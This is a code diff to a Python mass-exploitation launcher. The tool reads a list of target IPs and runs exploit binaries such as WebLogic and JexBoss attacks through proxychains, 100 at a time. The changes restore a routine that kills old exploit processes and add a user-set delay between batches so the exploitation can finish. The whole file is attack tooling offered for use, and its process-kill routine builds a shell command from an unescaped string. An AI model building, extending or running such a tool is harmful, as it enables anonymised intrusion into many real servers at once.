@@ -3,7 +3,7 @@
 import sys
 import os
 import time
-# import signal
+import signal
 import subprocess
 import util.console as console
 import util.colors as colors
@@ -20,13 +20,11 @@ ip_list = 'data/ip_list.txt'
 
 # in case too many exploits being executed simultaneously, we need to
 # terminate old ones before launching next 100
-'''
 def check_kill_process(pstring):
     for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
         fields = line.split()
         pid = fields[0]
         os.kill(int(pid), signal.SIGKILL)
-'''
 
 
 def jexboss(cmd, exploit_path):
@@ -150,7 +148,7 @@ def execute(cmd):
             console.print_error(
                 "[-] Error executing shell command `{}`: ".format(cmd) + str(e))
 
-# gonna use this in our exploiter
+
 scanner_args = []
 
 
@@ -188,7 +186,7 @@ def weblogic():
         console.print_error('[-] Invalid input')
         return
     jobs = 100
-    waitTime = 25  # actually it's deprecated
+    waitTime = 25
     scanner_args = (exploit, work_path, exec_path, custom_args, jobs, waitTime)
     scanner(scanner_args)
 
@@ -295,6 +293,14 @@ def attack():
             'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                 exec_path),
             d.join(custom_args))
+        while True:
+            try:
+                waitTime = int(input(
+                    "    [*] and How long do you want me to wait between every 100 targets? (make it longer to fully complete the exploitation) ").strip())
+                break
+            except:
+                console.print_error("    [-] Invalid input")
+                continue
         scanner_args = (
             exploit,
             work_path,
@@ -311,6 +317,11 @@ def scanner(scanner_args):
     global ip_list
     exploit, work_path, exec_path, custom_args, jobs, waitTime = scanner_args[
         0], scanner_args[1], scanner_args[2], scanner_args[3], scanner_args[4], scanner_args[5]
+    '''
+    d = ' '
+    print('Exec: '+exec_path, 'work_path: '+work_path, '\nRun: '+d.join(e_args))
+    time.sleep(10)
+    '''
     e_args = [
         'proxychains4',
         '-q',
@@ -321,6 +332,7 @@ def scanner(scanner_args):
         exec_path]
     f = open(init_dir + '/' + ip_list)
     os.chdir('./exploits/' + work_path)
+    # print(os.getcwd())
     console.print_warning('\n[!] It might be messy, get ready!' + '\n')
     time.sleep(3)
     count = 0
@@ -338,29 +350,29 @@ def scanner(scanner_args):
             exit()
         count += 1
         tested += 1
-        try:
-            e_args += ['-t', ip]
-            e_args += custom_args
-            proc = subprocess.Popen(e_args)
-            time.sleep(.1)
-            e_args = [
-                'proxychains4',
-                '-q',
-                '-f',
-                proxy_conf,
-                './' +
-                exec_path]
-            if count == jobs or count == 0:
-                count = 0
-                rnd += 1
-                out, err = proc.communicate()
-                if proc.returncode is not None:
-                    proc.kill()
-                continue
-            sys.stdout.flush()
-            os.system('clear')
-        except:
-            pass
+        if count == jobs or count == 0:
+            count = 0
+            rnd += 1
+            time.sleep(waitTime)
+            check_kill_process(exploit)
+            continue
+        else:
+            try:
+                e_args += ['-t', ip]
+                e_args += custom_args
+                proc = subprocess.Popen(e_args)
+                time.sleep(.1)
+                e_args = [
+                    'proxychains4',
+                    '-q',
+                    '-f',
+                    proxy_conf,
+                    './' +
+                    exec_path]
+                sys.stdout.flush()
+                os.system('clear')
+            except:
+                pass
     os.system('clear')
     os.chdir(init_dir)
     console.print_success('\n[+] All done!\n')
